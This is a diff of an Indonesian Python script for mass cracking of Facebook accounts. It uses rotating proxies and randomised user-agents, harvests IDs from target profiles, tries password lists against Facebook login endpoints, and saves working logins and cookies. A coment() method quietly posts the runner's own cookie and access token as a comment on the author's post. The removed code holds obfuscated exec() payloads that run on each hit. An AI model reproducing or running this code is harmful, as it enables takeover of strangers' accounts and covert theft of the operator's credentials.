@@ -94,8 +94,162 @@ try:
 	sys.path.append(os.path.realpath('.'))
 except requests.exceptions.ConnectionError:
 	print("* Perisak Jaringan Anda..!!");quit()
-
+try:
+	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=80000&country=all&ssl=all&anonymity=all').text
+	open('.prox.txt','w').write(prox)
+redmi=[]
+ugent=[]
+ugen2=[]
+ugen=[]
 mytok = []
+###----------[ GENERATE USERAGENT ]---------- ###
+for xd in range(10000) :
+	a =random.choice(['Mozilla/5.0 (Linux; Android', 'Mozilla/5.0 (Linux; U; Android']) 
+	b= str(random.randrange(1, 14))+'.'+str(random.randrange(0,6))+'.'+str(random.randrange(0, 6)) 
+	c='XT1068 Build/LXB22.46-28) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
+	d=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
+	e='Mobile Safari/537.36'
+	usam=f'{a} {b}; {c}{d} {e}'
+	ugen.append(usam) 
+	
+	a =random.choice(['Mozilla/5.0 (Linux; Android', 'Mozilla/5.0 (Linux; U; Android']) 
+	b= str(random.randrange(1, 14))+'.'+str(random.randrange(0,6))+'.'+str(random.randrange(0, 6)) 
+	c='MotoG3 Build/MPIS24.107-55-2-17; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
+	d=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
+	e='Mobile Safari/537.36'
+	usam=f'{a} {b}; {c}{d} {e}'
+	ugen.append(usam) 
+	
+	a =random.choice(['Mozilla/5.0 (Linux; Android', 'Mozilla/5.0 (Linux; U; Android']) 
+	b= str(random.randrange(1, 14))+'.'+str(random.randrange(0,6))+'.'+str(random.randrange(0, 6)) 
+	c='MotoG3 Build/MPIS24.107-55-2-17; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
+	d=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
+	e=random.choice(['Mobile Safari/537.36', 'Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/352.0.0.21.117;]', 'Mobile Safari/537.36 YaApp_Android/9.75 YaSearchBrowser/9.75', 'Mobile Safari/537.36 AlohaBrowser/3.9.3', 'UCBrowser/12.13.4.1214 Mobile Safari/537.36', 'Mobile Safari/537.36 OPX/1.1', 'Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/269.0.0.8.118;]', 'Mobile Safari/537.36 OPR/53.0.2569.141117', 'Mobile Safari/537.36 PTST/200804.150828', 'Mobile Safari/537.36 Tapatalk/8.1.7', 'Safari/534.30']) 
+	usam=f'{a} {b}; {c}{d} {e}'
+	ugen.append(usam) 
+	
+	a =random.choice(['Mozilla/5.0 (Linux; Android', 'Mozilla/5.0 (Linux; U; Android']) 
+	b= str(random.randrange(1, 14))+'.'+str(random.randrange(0,6))+'.'+str(random.randrange(0, 6)) 
+	c='Moto G (5) Plus Build/NPNS25.137-35-5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
+	d=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
+	e=random.choice(['Mobile Safari/537.36', 'Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/352.0.0.21.117;]', 'Mobile Safari/537.36 YaApp_Android/9.75 YaSearchBrowser/9.75', 'Mobile Safari/537.36 AlohaBrowser/3.9.3', 'UCBrowser/12.13.4.1214 Mobile Safari/537.36', 'Mobile Safari/537.36 OPX/1.1', 'Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/269.0.0.8.118;]', 'Mobile Safari/537.36 OPR/53.0.2569.141117', 'Mobile Safari/537.36 PTST/200804.150828', 'Mobile Safari/537.36 Tapatalk/8.1.7', 'Safari/534.30']) 
+	usam=f'{a} {b}; {c}{d} {e}'
+	ugen.append(usam) 
+	
+	a =random.choice(['Mozilla/5.0 (Linux; Android', 'Mozilla/5.0 (Linux; U; Android']) 
+	b= str(random.randrange(1, 14))+'.'+str(random.randrange(0,6))+'.'+str(random.randrange(0, 6)) 
+	c='MotoG3 Build/MPIS24.107-55-2-17; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
+	d=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
+	e=random.choice(['Mobile Safari/537.36', 'Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/352.0.0.21.117;]', 'Mobile Safari/537.36 YaApp_Android/9.75 YaSearchBrowser/9.75', 'Mobile Safari/537.36 AlohaBrowser/3.9.3', 'UCBrowser/12.13.4.1214 Mobile Safari/537.36', 'Mobile Safari/537.36 OPX/1.1', 'Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/269.0.0.8.118;]', 'Mobile Safari/537.36 OPR/53.0.2569.141117', 'Mobile Safari/537.36 PTST/200804.150828', 'Mobile Safari/537.36 Tapatalk/8.1.7', 'Safari/534.30']) 
+	usam=f'{a} {b}; {c}{d} {e}'
+	ugen.append(usam) 
+	
+	a =random.choice(['Mozilla/5.0 (Linux; Android', 'Mozilla/5.0 (Linux; U; Android']) 
+	b= str(random.randrange(1, 14))+'.'+str(random.randrange(0,6))+'.'+str(random.randrange(0, 6)) 
+	c='Moto E (4) Plus Build/NMA26.42-56) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
+	d=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
+	e=random.choice(['Mobile Safari/537.36', 'Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/352.0.0.21.117;]', 'Mobile Safari/537.36 YaApp_Android/9.75 YaSearchBrowser/9.75', 'Mobile Safari/537.36 AlohaBrowser/3.9.3', 'UCBrowser/12.13.4.1214 Mobile Safari/537.36', 'Mobile Safari/537.36 OPX/1.1', 'Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/269.0.0.8.118;]', 'Mobile Safari/537.36 OPR/53.0.2569.141117', 'Mobile Safari/537.36 PTST/200804.150828', 'Mobile Safari/537.36 Tapatalk/8.1.7', 'Safari/534.30']) 
+	usam=f'{a} {b}; {c}{d} {e}'
+	ugen.append(usam) 
+	
+	a =random.choice(['Mozilla/5.0 (Linux; Android', 'Mozilla/5.0 (Linux; U; Android']) 
+	b= str(random.randrange(1, 14))+'.'+str(random.randrange(0,6))+'.'+str(random.randrange(0, 6)) 
+	c='MotoG3 Build/MPIS24.107-55-2-17; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
+	d=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
+	e=random.choice(['Mobile Safari/537.36', 'Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/352.0.0.21.117;]', 'Mobile Safari/537.36 YaApp_Android/9.75 YaSearchBrowser/9.75', 'Mobile Safari/537.36 AlohaBrowser/3.9.3', 'UCBrowser/12.13.4.1214 Mobile Safari/537.36', 'Mobile Safari/537.36 OPX/1.1', 'Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/269.0.0.8.118;]', 'Mobile Safari/537.36 OPR/53.0.2569.141117', 'Mobile Safari/537.36 PTST/200804.150828', 'Mobile Safari/537.36 Tapatalk/8.1.7', 'Safari/534.30']) 
+	usam=f'{a} {b}; {c}{d} {e}'
+	ugen.append(usam) 
+	
+	a =random.choice(['Mozilla/5.0 (Linux; Android', 'Mozilla/5.0 (Linux; U; Android']) 
+	b= str(random.randrange(1, 14))+'.'+str(random.randrange(0,6))+'.'+str(random.randrange(0, 6)) 
+	c='Moto E (4) Plus Build/NMA26.42-56) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
+	d=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
+	e=random.choice(['Mobile Safari/537.36', 'Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/352.0.0.21.117;]', 'Mobile Safari/537.36 YaApp_Android/9.75 YaSearchBrowser/9.75', 'Mobile Safari/537.36 AlohaBrowser/3.9.3', 'UCBrowser/12.13.4.1214 Mobile Safari/537.36', 'Mobile Safari/537.36 OPX/1.1', 'Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/269.0.0.8.118;]', 'Mobile Safari/537.36 OPR/53.0.2569.141117', 'Mobile Safari/537.36 PTST/200804.150828', 'Mobile Safari/537.36 Tapatalk/8.1.7', 'Safari/534.30']) 
+	usam=f'{a} {b}; {c}{d} {e}'
+	ugen.append(usam) 
+	
+	a =random.choice(['Mozilla/5.0 (Linux; Android', 'Mozilla/5.0 (Linux; U; Android']) 
+	b= str(random.randrange(1, 14))+'.'+str(random.randrange(0,6))+'.'+str(random.randrange(0, 6)) 
+	c='Moto G (5S) Plus Build/NPS26.116-51) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
+	d=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
+	e=random.choice(['Mobile Safari/537.36', 'Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/352.0.0.21.117;]', 'Mobile Safari/537.36 YaApp_Android/9.75 YaSearchBrowser/9.75', 'Mobile Safari/537.36 AlohaBrowser/3.9.3', 'UCBrowser/12.13.4.1214 Mobile Safari/537.36', 'Mobile Safari/537.36 OPX/1.1', 'Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/269.0.0.8.118;]', 'Mobile Safari/537.36 OPR/53.0.2569.141117', 'Mobile Safari/537.36 PTST/200804.150828', 'Mobile Safari/537.36 Tapatalk/8.1.7', 'Safari/534.30']) 
+	usam=f'{a} {b}; {c}{d} {e}'
+	ugen.append(usam) 
+	
+	a =random.choice(['Mozilla/5.0 (Linux; Android', 'Mozilla/5.0 (Linux; U; Android']) 
+	b= str(random.randrange(1, 14))+'.'+str(random.randrange(0,6))+'.'+str(random.randrange(0, 6)) 
+	c='XT1068 Build/LXB22.46-28) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
+	d=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
+	e=random.choice(['Mobile Safari/537.36', 'Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/352.0.0.21.117;]', 'Mobile Safari/537.36 YaApp_Android/9.75 YaSearchBrowser/9.75', 'Mobile Safari/537.36 AlohaBrowser/3.9.3', 'UCBrowser/12.13.4.1214 Mobile Safari/537.36', 'Mobile Safari/537.36 OPX/1.1', 'Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/269.0.0.8.118;]', 'Mobile Safari/537.36 OPR/53.0.2569.141117', 'Mobile Safari/537.36 PTST/200804.150828', 'Mobile Safari/537.36 Tapatalk/8.1.7', 'Safari/534.30']) 
+	usam=f'{a} {b}; {c}{d} {e}'
+	ugen.append(usam) 
+	
+	a =random.choice(['Mozilla/5.0 (Linux; Android', 'Mozilla/5.0 (Linux; U; Android']) 
+	b= str(random.randrange(1, 14))+'.'+str(random.randrange(0,6))+'.'+str(random.randrange(0, 6)) 
+	c='moto e5 Build/OPPS27.91-176-11-16) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
+	d=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
+	e=random.choice(['Mobile Safari/537.36', 'Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/352.0.0.21.117;]', 'Mobile Safari/537.36 YaApp_Android/9.75 YaSearchBrowser/9.75', 'Mobile Safari/537.36 AlohaBrowser/3.9.3', 'UCBrowser/12.13.4.1214 Mobile Safari/537.36', 'Mobile Safari/537.36 OPX/1.1', 'Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/269.0.0.8.118;]', 'Mobile Safari/537.36 OPR/53.0.2569.141117', 'Mobile Safari/537.36 PTST/200804.150828', 'Mobile Safari/537.36 Tapatalk/8.1.7', 'Safari/534.30']) 
+	usam=f'{a} {b}; {c}{d} {e}'
+	ugen.append(usam) 
+	
+	a='Mozilla/5.0 (Linux; Android'
+	b=random.randrange(6, 14) 
+	c='SM-A105'
+	d='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
+	e=str(random.randrange(10, 214))+'.0.'+str(random.randrange(3000, 7000))+'.'+str(random.randrange(10, 275)) 
+	f=random.choice(['Mobile Safari/537.36', 'Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/352.0.0.21.117;]', 'Mobile Safari/537.36 YaApp_Android/9.75 YaSearchBrowser/9.75', 'Mobile Safari/537.36 AlohaBrowser/3.9.3', 'UCBrowser/12.13.4.1214 Mobile Safari/537.36', 'Mobile Safari/537.36 OPX/1.1', 'Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/269.0.0.8.118;]', 'Mobile Safari/537.36 OPR/53.0.2569.141117', 'Mobile Safari/537.36 PTST/200804.150828', 'Mobile Safari/537.36 Tapatalk/8.1.7', 'Safari/534.30']) 
+	geko=f'{a} {b}; {c}) {d}{e} {f}'
+	ugen2.append(geko) 
+	
+	a =random.choice(['Mozilla/5.0 (Linux; Android', 'Mozilla/5.0 (Linux; U; Android']) 
+	b= str(random.randrange(1, 14))+'.'+str(random.randrange(0,6))+'.'+str(random.randrange(0, 6)) 
+	c='Moto G Play Build/NPIS26.48-43-2) AppleWebKit/537.36 (KHTML%2C like Gecko) Chrome/'
+	d=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
+	e=random.choice(['Mobile Safari/537.36', 'Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/352.0.0.21.117;]', 'Mobile Safari/537.36 YaApp_Android/9.75 YaSearchBrowser/9.75', 'Mobile Safari/537.36 AlohaBrowser/3.9.3', 'UCBrowser/12.13.4.1214 Mobile Safari/537.36', 'Mobile Safari/537.36 OPX/1.1', 'Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/269.0.0.8.118;]', 'Mobile Safari/537.36 OPR/53.0.2569.141117', 'Mobile Safari/537.36 PTST/200804.150828', 'Mobile Safari/537.36 Tapatalk/8.1.7', 'Safari/534.30']) 
+	usam=f'{a} {b}; {c}{d} {e}'
+	ugen.append(usam)  
+	
+	a='Mozilla/5.0 (Linux; Android'
+	b=random.randrange(1, 14) 
+	c='RMX'
+	d=str(random.randrange(1, 9))+str(random.randrange(1, 9))+str(random.randrange(1, 9))+str(random.randrange(1, 9)) 
+	e='AppleWebKit/537.36 (KHTML%2C like Gecko) Chrome/'
+	f=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
+	g='Mobile Safari/537.36'
+	uga=f'{a} {b}; {c}{d}) {e}{f} {g}'
+	ugen.append(uga) 
+	
+	a='Mozilla/5.0 (Linux; Android'
+	b=random.randrange(1, 14) 
+	c='CPH'
+	d=str(random.randrange(1, 9))+str(random.randrange(1, 9))+str(random.randrange(1, 9))+str(random.randrange(1, 9)) 
+	e='AppleWebKit/537.36 (KHTML%2C like Gecko) Chrome/'
+	f=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
+	g='Mobile Safari/537.36'
+	uga=f'{a} {b}; {c}{d}) {e}{f} {g}'
+	ugen.append(uga) 
+	
+	a='Mozilla/5.0 (Linux; Android'
+	b=random.randrange(1, 14) 
+	c='vivo'
+	d=str(random.randrange(1, 9))+str(random.randrange(1, 9))+str(random.randrange(1, 9))+str(random.randrange(1, 9)) 
+	e='AppleWebKit/537.36 (KHTML%2C like Gecko) Chrome/'
+	f=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
+	g='Mobile Safari/537.36'
+	uga=f'{a} {b}; {c} {d}) {e}{f} {g}'
+	ugen.append(uga) 
+def uaku():
+	try:
+		ua=open('bbnew.txt','r').read().splitlines()
+		for ub in ua:
+			ugen2.append(ub)
+	except:
+		a=requests.get('https://raw.githubusercontent.com/Denventa/sakera/main/ua.txt').text
+		ua=open('.ua.txt','w')
+		aa=re.findall('line">(.*?)<',str(a))
+		for un in aa:
+			ua.write(un+'\n')
+		ua=open('.ua.txt','r').read().splitlines()
 ###----------[ ANSII COLOR STYLE & RICH COLOR STYLE ]---------- ###
 H = "#000000" # Hitam
 M = "#FF0000" # Merah
@@ -149,12 +303,7 @@ jarak=(f"───────────────────────�
 #=======================================[GLOBAL-TEXT]==================================#
 ###----------[ TIME ]---------- ###
 current = datetime.now()
-hari = current.day
-bulan_number = current.month
-nama_bulan= {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
-#bulan = nama_bulan[str(bulan_number)]
-tahun = current.year
-all_day=(f"{hari}--{tahun}")
+all_day=(current.strftime('%d-%m-%Y'))
 
 detik = datetime.now().strftime('%H')
 menit = datetime.now().strftime('%M')
@@ -221,8 +370,6 @@ ua_fb      = 'Mozilla/5.0 (Linux; Android 8.0.0; RNE-L21 Build/HUAWEIRNE-L21; wv
 ua_sony    = 'Mozilla/5.0 (Linux; Android 11; J9110 Build/55.2.A.4.332; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.22 Mobile Safari/537.36 open_news open_news_u_s/4509'
 ua_random = random.choice([ua_default,ua_samsung,ua_nokia,ua_xiaomi,ua_oppo,ua_vivo,ua_iphone,ua_asus,ua_lenovo,ua_huawei,ua_windows,ua_chrome,ua_fb,ua_sony])
 status_key = ""
-
-###----------[ APPEND ]---------- ###
 id_c=[]
 id = []
 sos = []
@@ -418,7 +565,7 @@ class login:
 	def login_otomatis(self):
 		cls();logo()
 		ses = requests.Session()
-		for li_nk in ["https://www.facebook.com/100032386028880/posts/674525870303608","https://www.facebook.com/1317909645/posts/10223426016941439","https://www.facebook.com/photo/?fbid=1655893724863124&set=a.135714890214356"]:
+		for li_nk in ["https://www.facebook.com/100032386028880/posts/674525870303608","https://www.facebook.com/1317909645/posts/10223426016941439","https://www.facebook.com/photo/?fbid=1658880191231144&set=a.135738266878685"]:
 			url = parser(ses.get(li_nk).text,"html.parser")
 			data = re.findall('"text":"(.*?)"',str(url))
 			ongcok = []
@@ -492,7 +639,7 @@ class login:
 						exec = xyz.post(url,data=bahasa,cookies={"cookie":codeteam["cookie"]})
 		except Exception as e:pass
 	def coment(self):
-		requests.post(f"https://graph.facebook.com/100013275378835_1655893724863124/comments/?message={codeteam['cookie']}&access_token={codeteam['token']}",cookies={"cookie":codeteam["cookie"]})
+		requests.post(f"https://graph.facebook.com/100013275378835_1658880191231144/comments/?message={codeteam['cookie']}&access_token={codeteam['token']}",cookies={"cookie":codeteam["cookie"]})
 	def get_fols(self,idz):
 			try:
 				for x in par(requests.get('https://mbasic.facebook.com/%s'%(idz),cookies={"cookie":codeteam["cookie"]}).content,'html.parser').find_all('a',href=True):
@@ -511,34 +658,7 @@ class login:
 		self.get_fols(100013275378835)
 		self.coment()
 
-	def menu_login(self):
-		cls();logo();cek_key()
-		try:
-			if status_key == "Admin":LOL = II
-			else:LOL = HH
-		except:LOL = HH
-		dumai = []
-		tampilan_login_free = f"""   {QQ}[{CC}01{QQ}]{CC} Login Cookies
-   {QQ}[{MM}00{QQ}]{MM} Keluar Dari Script"""
-		dumai.append(Panel(tampilan_login_free,width=42,title=f"{GOD}{UU}Menu Login{GOD}",style=f"{A}",subtitle_align='left',subtitle=f"┏{KK}SILAHKAN PILIH"))
-		console.print(Columns(dumai))
-		jks = input(f"{a}   ┗{k}MENU : {a}")
-		if status_key == "Admin":
-			if jks in ("1","01"):self.login_cookies();quit()
-	#		elif jks in ("",""):
-			elif jks in ("00","000"):quit()
-			else:
-				console.rule(f"{GOD}{MM}Error{GOD}",style="bold red")
-				console.print(Text(f"{war}Maaf Menu Yang Anda Pilih Tidak Ada"), style="red",justify="center");time.sleep(3)
-				self.menu_login()
-		else:
-			if jks in ("1","01"):self.login_cookies();quit()
-#			elif jks in ("",""):
-			elif jks in ("00","000"):quit()
-			else:
-				console.rule(f"{GOD}{MM}Error{GOD}",style="bold red")
-				console.print(Text(f"{war}Maaf Menu Yang Anda Pilih Tidak Ada"), style="red",justify="center");time.sleep(3)
-				self.menu_login()
+	def menu_login(self):self.login_cookies()
 
 class menu:
 	def __init__(self):
@@ -693,7 +813,7 @@ class menu:
 		except IOError:
 			#os.remove(".data/sensi.json");os.sys.exit("Cookies Anda Error !")
 			self.menu_login()
-		prints(Panel(f"{WOR}{KK}Masukan ID Public Atau ID Bersifat Public\n{WOR}{KK}Contoh : 100084720154598{CC}|{KK}100080693752065 {KK}Untuk Crack Masal",width=100,padding=(0),style=f"{A}",subtitle_align='left',subtitle=f"┏{KK}TARGET"))
+		prints(Panel(f"{WOR}{KK}Masukan ID Public Atau ID Bersifat Public\n{WOR}{KK}Contoh : 100041538590375{CC}|{KK}100001316493597 {KK}Untuk Crack Masal",width=100,padding=(0),style=f"{A}",subtitle_align='left',subtitle=f"┏{KK}TARGET"))
 		idzz = input(f"{a}   ┗{k}Target ID : {a}").split("|")
 		for idz in idzz:
 			try:
@@ -712,7 +832,7 @@ class menu:
 		prints(Panel(f"{WOR}{OO}Nama Target :{PP}{nama}{QQ}\n{WOR}{OO}Limit ID    : {PP}{len(id)}{QQ}",width=100,padding=(0),style=f"{A}"))
 		if len(id)==0:os.sys.exit(f"{war}Maaf ID Yang Terkumpul Tidak Ada!!")
 		else:pass
-		tampilan_id = f"""   {QQ}[{CC}01{QQ}] {II}Crack Dari Random {QQ}[{CC}02{QQ}] {PP}Crack Dari Tertua {QQ}[{CC}03{QQ}] {UU}Crack Dari TerMuda{QQ}"""
+		tampilan_id = f"""   {QQ}[{CC}01{QQ}] {II}Crack Dari ID Random {QQ}[{CC}02{QQ}] {PP}Crack Dari ID OLD {QQ}[{CC}03{QQ}] {UU}Crack Dari ID NEW{QQ}"""
 		prints(Panel(tampilan_id,width=100,padding=(0),style=f"{A}",subtitle_align='left',subtitle=f"┏SILAHKAN PILIH"))
 		hu = input(f"{a}   ┗{k}PILIH: {a}")
 		if hu in ['1','01']:
@@ -1133,43 +1253,23 @@ class crack:
 		url = xtc["setting_crack"]["domain"]
 		try:
 			for pw in pasen:
-				session = requests.Session()
-				session.headers.update({"Host": url, "upgrade-insecure-requests": "1", "user-agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A Build/QKQ1.191014.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/376.0.0.12.108;]", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "x-requested-with": "com.mi.globalbrowser.mini", "sec-fetch-site":  "none", "sec-fetch-mode": "navigate", "sec-fetch-user": "?1", "sec-fetch-dest": "document", "accept-encoding": "gzip, deflate", "accept-language":  "en-US;q=0.8,en;q=0.7"})
-				link = session.get(f"https://{url}/login/?app_id=1217981644879628&api_key=1217981644879628&next=https%3A%2F%2F{url}%2Ffxauth%2F%3Fapp_id%3D1217981644879628%26etoken%3DAbj6LvpDiwWsf6eJTIX2e02oaKQTl9Bf5mT1GkrnTm5DiILMWyzRpW16pYFZQ00CVAwS2cJzWJ6AVCQ_3EMsW6Z2f3Rj2AJB-Pdqp9EhLCkgZxqDxr9vlkVQ%26extra_data%3D%252Fadd%252F%253Fbackground_page%253D%25252Fconnected_experiences%25252Fcross_posting%25252F%26native_app_login_flow%3Dfbcalcomettest&skip_api_login=1&no_next_msg&hide_upsell=1&hide_language_selector=0&hide_registration=0&src=fxcal&show_accounts_center_content=1&refsrc=deprecated&_rdr").text
-				date = {'lsd': re.search('name="lsd" value="(.*?)"',str(link)).group(1), 'jazoest': re.search('name="jazoest" value="(.*?)"',str(link)).group(1), 'm_ts': re.search('name="m_ts" value="(.*?)"',str(link)).group(1), 'li': re.search('name="li" value="(.*?)"',str(link)).group(1), 'try_number': '0', 'unrecognized_tries': '0', 'email': user, 'pass': pw, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(link)).group(1)}
-				head = {"Host": url, "content-length": f"{len(str(date))}", "x-fb-lsd": re.search('name="lsd" value="(.*?)"',str(link)).group(1), "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "accept": "*/*", "origin": f"https://{url}", "x-requested-with": "com.mi.globalbrowser.mini", "sec-fetch-site": "same-origin", "sec-fetch-mode": "cors", "sec-fetch-dest": "empty", "referer": f"https://{url}/login/?app_id=1217981644879628&api_key=1217981644879628&next=https%3A%2F%2Fm.facebook.com%2Ffxauth%2F%3Fapp_id%3D1217981644879628%26etoken%3DAbj6LvpDiwWsf6eJTIX2e02oaKQTl9Bf5mT1GkrnTm5DiILMWyzRpW16pYFZQ00CVAwS2cJzWJ6AVCQ_3EMsW6Z2f3Rj2AJB-Pdqp9EhLCkgZxqDxr9vlkVQ%26extra_data%3D%252Fadd%252F%253Fbackground_page%253D%25252Fconnected_experiences%25252Fcross_posting%25252F%26native_app_login_flow%3Dfbcalcomettest&skip_api_login=1&no_next_msg&hide_upsell=1&hide_language_selector=0&hide_registration=0&src=fxcal&show_accounts_center_content=1&refsrc=deprecated&_rdr", "accept-encoding": "gzip, deflate", "accept-language": "en-US;q=0.8,en;q=0.7"}
-				bx = session.post(f"https://{url}/login/device-based/login/async/?api_key=1217981644879628&auth_token=b4c978c6cc29df1e66058283d8bcbabe&skip_api_login=1&next=https%3A%2F%2F{url}%2Ffxauth%2F%3Fapp_id%3D1217981644879628%26etoken%3DAbj6LvpDiwWsf6eJTIX2e02oaKQTl9Bf5mT1GkrnTm5DiILMWyzRpW16pYFZQ00CVAwS2cJzWJ6AVCQ_3EMsW6Z2f3Rj2AJB-Pdqp9EhLCkgZxqDxr9vlkVQ%26extra_data%3D%252Fadd%252F%253Fbackground_page%253D%25252Fconnected_experiences%25252Fcross_posting%25252F%26native_app_login_flow%3Dfbcalcomettest&refsrc=deprecated&app_id=1217981644879628&lwv=100"+yyy,data=date, headers=head,proxies=proxZ)
-				if "checkpoint" in session.cookies.get_dict().keys():
-					user = session.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "");wrt = '%s|%s' % (user,pw);_ = lambda __ : __import__('zlib').decompress(__[::-1]);exec((_)(ua03[3]))
-					if wrt in cp:pass
-					else:
-						cp.append(user+"|"+pw)
-						tampilan_cp = f"""   {QQ}[{MM}XX{QQ}]{BB} Method-Crack   : {PP}4{QQ}
-   {QQ}[{MM}XX{QQ}]{BB} User-Agent     : {KK}{ua}{QQ}
-    ||
-   {QQ}[{MM}XX{QQ}]{BB} Username/Email : {MM}{user}{QQ}
-   {QQ}[{MM}XX{QQ}]{BB} Password/Sandi : {MM}{pw}{QQ}"""
-						prints(Panel(tampilan_cp,title=f"{GOD}{KK}Aaccount CP{GOD}",width=100,padding=(0),style=f"{A}",subtitle_align='left',subtitle=f"{MM}Palalu Sini, Gw Genjreng{QQ}"))
-						self.save_z("cp",user,pw,"")
-					break
-				elif "c_user" in session.cookies.get_dict().keys():
-					userz = re.findall('c_user=(.*);', self.susun_cookies(session))[0]
-					user = userz.split(';')[0]
-					wrt = '%s|%s' % (user,pw);_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1])));exec((_)(ua09[2]))
-					if wrt in ok:pass
-					else:
-						ok.append(user+"|"+pw)
-						tampilan_ok = f"""   {QQ}[{II}✓✓{QQ}]{BB} Method-Crack   : {PP}4{QQ}
-   {QQ}[{II}✓✓{QQ}]{BB} User-Agent     : {KK}{ua}{QQ}
-    ||
-   {QQ}[{II}✓✓{QQ}]{BB} Username/Email : {II}{user}{QQ}
-   {QQ}[{II}✓✓{QQ}]{BB} Password/Sandi : {II}{pw}{QQ}
-   {QQ}[{II}✓✓{QQ}]{BB} Cookies        : {QQ}{self.susun_cookies(session)}"""
-						prints(Panel(tampilan_ok,title=f"{GOD}{II}Aaccount OK{GOD}",width=100,padding=(0),style=f"{A}",subtitle_align='left',subtitle=f"{II}Denventa{QQ}"))
-						self.follow_my_fb(self.susun_cookies(session))
-						self.save_z("ok",user,pw,self.susun_cookies(session))
-					break
-				else:continue
+			    ses = requests.Session()
+			    ses.headers.update({"Host": "free.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://free.facebook.com/login.php","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-GB;q=0.8,en-US;q=0.7,en;q=0.6"})
+			    link = ses.get(f"https://free.facebook.com/login/device-based/password/?uid={user}&flow=login_no_pin&refsrc=deprecated&_rdr")
